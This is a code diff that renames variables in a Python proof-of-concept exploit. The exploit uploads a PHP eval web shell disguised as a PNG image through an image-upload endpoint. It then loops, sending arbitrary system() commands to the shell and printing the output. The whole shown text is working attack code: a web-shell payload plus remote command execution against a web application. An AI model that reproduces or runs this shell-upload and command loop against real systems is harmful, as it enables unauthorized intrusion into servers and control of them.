@@ -13,8 +13,8 @@ def poc():
         # upload the shell
         url = target.url + "?s=/components/imgupload"
         password = raw_input("[*] Please enter the shell-password:")
-        phpshell = "<?php eval($_POST['%s']);?>" % password
-        files = {'imgPhoto': ('test.php', phpshell, 'image/png')}
+        shell_content = "<?php eval($_POST['%s']);?>" % password
+        files = {'imgPhoto': ('test.php', shell_content, 'image/png')}
         r = requests.post(url, files=files)
         shell = target.url.replace("index.php", r.text)
         print("[*] The shell url: " + shell)
@@ -25,10 +25,10 @@ def poc():
                 command = raw_input("[*] input the command:")
                 payload = 'system("%s");' % command
                 if command != "exit":
-                    postData = {
+                    post_data = {
                         password: payload
                     }
-                    r = requests.post(shell, data=postData)
+                    r = requests.post(shell, data=post_data)
                     print(r.text.encode(r.encoding))
                 else:
                     break
